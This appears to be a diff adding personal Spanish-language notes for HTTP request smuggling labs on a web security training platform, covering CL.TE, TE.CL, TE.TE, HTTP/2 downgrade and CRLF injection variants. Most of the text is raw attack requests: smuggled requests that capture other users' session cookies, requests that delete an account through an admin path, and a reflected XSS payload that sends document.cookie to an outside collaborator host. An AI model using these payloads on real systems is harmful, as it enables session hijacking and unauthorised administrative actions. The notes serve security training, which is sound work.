@@ -1,0 +1,249 @@
+Extensions--> Flow, Http RequestSmuggler
+httpsmuggler --> smuggleProbe
+
+
+/-/-/-/- IMPORTANTS -/-/-/-
+/-/-/ smuggling to capture other users' requests /-/-/
+
+El 1º content-lenght se cambia sólo, el 2º sumo los bytes una petición a / normal con ctrl +a
+pongo el comment lo último
+sumo petición + body desde csrf hasta comment=sexo
+voy sumando el 2º lenght hasta q veo la cookie de la víctima en el comentario correspondiente
+Tirar una request legit a /
+
+Content-Length: 285
+Transfer-Encoding: chunked
+
+0
+
+POST /post/comment HTTP/1.1
+Cookie: session=0IwQ8pcLZxIbFJg173HpbrR6gqmpDiCJ
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 970
+
+csrf=9AmnZ8oCpeXZxOM4C1CoqXVMQLSGQG2e&postId=1&name=unbesoo&email=quiero%40queme.beses&website=http%3A%2F%2Fhola.com&comment=sexo
+
+/-/-/ smuggling to deliver reflected XSS /-/-/
+
+SCANNER no saca xss
+primero probar si la petición se smugglea
+ir probando poco a poco
+
+POST / HTTP/1.1 --> probar http/2 
+Host: lab.net
+Content-Length: 243 --> se cambia solo , NO DAR OPCIÓN UPDATE CL
+Transfer-Encoding: chunked
+
+0
+
+GET /post?postId=5 HTTP/1.1
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 15
+User-Agent: focas"/><script>document.location='http://76boyp9la02fagrxtvi6i1c8vz1qpgd5.oastify.com/?c='+document.cookie</script>
+
+x=1
+0
+
+
+
+/-/-/-/- CL.TE -/-/-/-
+
+
+Content-lenght: 130..  --> funciona gracias a que hemos puesto ese content-lenght va desde GET hasta x=
+Transfer-Encoding: chunked...
+
+0 --> marcamos el final de la primera request
+
+GET /admin HTTP/1.1
+Host: localhost
+Content-Type: asdfsd
+Content-lenght: 130..
+
+x=
+
+/-/-/-/-/-/  1 -/-/-/-/-/
+
+Transfer-Encoding:  chunked
+Connection: close
+
+0
+
+GET /404 HTTP/1.1
+X-Ignore: X --> a partir de aquí lo ignora
+
+/-/-/-/-/-/  2 /-/-/-/-/-/
+
+Content-Length: 138 --> funciona gracias a que hemos puesto ese content-lenght
+Transfer-Encoding: chunked
+
+0
+
+GET /admin/delete?username=carlos HTTP/1.1
+Host: localhost
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 10
+
+x=
+
+/-/-/-/-/-/  3 -/-/-/-/-/
+
+Voy probando entre GET y POST en la 2º petición a ver que info me arroja con GET / o POST /
+
+Content-Length: 175 --> seleccionamos desde el 0 hasta sexo, sacamos estos bytes
+Transfer-Encoding: chunked
+
+0
+
+GET /admin/delete?username=carlos HTTP/1.1
+X-qUqxFY-Ip: 127.0.0.1  
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 200 --> cuántos bytes quiero que salgan en el response
+Connection: close
+
+search=sexo --> buscar en el response este valor
+
+
+/-/-/-/- TE.CL -/-/-/-/
+
+Content-lenght: 4
+Transfer-Encoding: chunked...
+
+55 --> lo que marque el Inspector desde el final del body que es x=1 hasta GET
+GET /admin HTTP/1.1
+Host: localhost
+Content-Type: asdfsd
+Content-lenght: 130..
+
+x=1  --> ojo con no equivocarse con los saltos de línea
+0/r/n
+/r/n
+
+/-/-/-/-/-/  1 -/-/-/-/-/
+
+Content-Length: 4 --> QUEREMOS SÓLO LOS  4 BYTES DE ANTES DEL 87
+Transfer-Encoding: chunked
+
+87 --> desde GET hasta x=1
+GET /admin/delete?username=carlos HTTP/1.1
+Host: localhost
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 15 --> IMPORTANTE 
+
+x=1
+0/r/n
+/r/n
+
+/-/-/-/-/-/  2  TE.TE / -/-/-/-/-/
+
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 4
+Transfer-Encoding: chunked
+Transfer-Encoding: csex --> hay discrepancias
+
+5c
+GPOST / HTTP/1.1
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 15
+
+x=1
+0/r/n
+/r/n
+
+/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/
+/-/-/-/-/-/  HTTP /2 / -/-/-/-/-/
+/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/
+
+/-/-/-/-/-/ H2.TE / -/-/-/-/-/
+
+SCAN lo detecta 
+Poner petición en HTTP/2 para que se  tenga en cuenta que la primera parte es HTTP/2
+mANDAMOS ESTA PETICIÓN AL intruder
+No se olvide en el 2º poner HTTP/1.1
+sniper --> Payloads --> Null Payloads
+en Settings intruder, marcar NO Update Content-lenght
+Cuidado con los delays porque la petición de admin está en la cola, si es muy rápido puede que no nos la de
+
+
+POST /packs HTTP/2
+Host: 0a5f007d03f3a0ec8107b6b900ca00ad.web-security-academy.net
+Content-Type: application/x-www-form-urlencoded
+Transfer-Encoding: chunked
+
+0
+
+GET /packs HTTP/1.1
+Host: 0a5f007d03f3a0ec8107b6b900ca00ad.web-security-academy.net/r/n
+
+
+/-/-/-/-/-/ H2.CL / -/-/-/-/-/
+Scan lo detecta
+No poner chunked
+vemos que hay un resources
+PAth de exploit server --> /resources
+Body Exploit Server --> alert(document.cookie)
+Mandamos a intruder la petición de abajo
+sniper --> Payloads --> Null Payloads
+en Settings intruder, marcar NO Update Content-lenght
+
+POST / HTTP/2
+Host: 0a07000403b9350c80703a4400ad0019.web-security-academy.net
+Content-Length: 0
+Connection: keep-alive
+
+GET /resources HTTP/1.1
+Host: exploit-0a23000003e835f6801a39b6017a00e1.exploit-server.net
+Content-Length: 5
+
+X=1
+
+
+/-/-/-/-/-/ CL.0 / -/-/-/-/-/
+
+Enviar en single connection group con una petición a / legit
+Quitamos grupo y enviamos normal
+
+POST /resources/images/blog.svg HTTP/2
+Host: 0a38006104eba045804b59c600fb004d.web-security-academy.net
+Cookie: session=XALonElato4UvWSpErSZcNeenEgVjv8H
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 51 --> no updateamos el content-lenght
+
+GET /admin/delete?username=carlos HTTP/1.1
+Sexo: x
+
+/-/-/-/-/-/ Inyecciones Retorno de Carro CRLF /-/-/-/-/-/
+HTTP/2 request splitting via CRLF injection
+
+añadimos al lado de inspector en Request headers esta línea, hacemos peticiones hasta que bos de un 302
+Eso es que el admin ha visitado y el server se equivoca a quién le tiene que devolver la petición
+
+bar
+
+GET /x HTTP/1.1
+ Host: 0a9f008c0408f2fa80f78584004b0082.web-security-academy.net
+
+/-/-/-/-/-/ HTTP/2 request smuggling via CRLF injection  /-/-/-/-/-/
+
+añado en el inspector header request 
+
+name: foo
+value: bar
+Transfer-Encoding: chunked
+
+Habilito: allow HTTP/2 ALPN override --> Burp ataques HTTP/2, aunque el sitio no anuncie esto
+Pruebo 
+0
+
+Smuggled
+
+si smugglea, probamos a que se guarde en el historial de búsquedas la siguiente petición 
+Envío peti durante 15 segundos 
+
+0
+
+POST / HTTP/1.1
+Host: 0a6c00d003792ea780c7dacb00cb007f.web-security-academy.net
+Cookie: session=GUuUxkWljMDj3TKC9BCoI8O5oqlhNdto; _lab_analytics=xprqpahoT2HuuV9mBPXcQ3zbuzsY5k0JzFr2NcCQQSYSLDXxnOmrFCmn19sDqqQQIZITuUHVx63pSP1mf36523lBpCGP58nAWQJfJdJGqgxRImQiM4mVFRnecwgGAcpQ0IsRQ4ncX5fPxMbGNVb5i9h98dDSOljpvf79n1Gd449AkkX8TcLdLwLTF7Taz4YBmXkJrbvGY9ZIXpmAr57pN3fgEU1yuw5Om8PmB4G2OjpiTcOu1GAeIiVj98AEbcvg
+Content-Length: 960
+
+search=pornoso
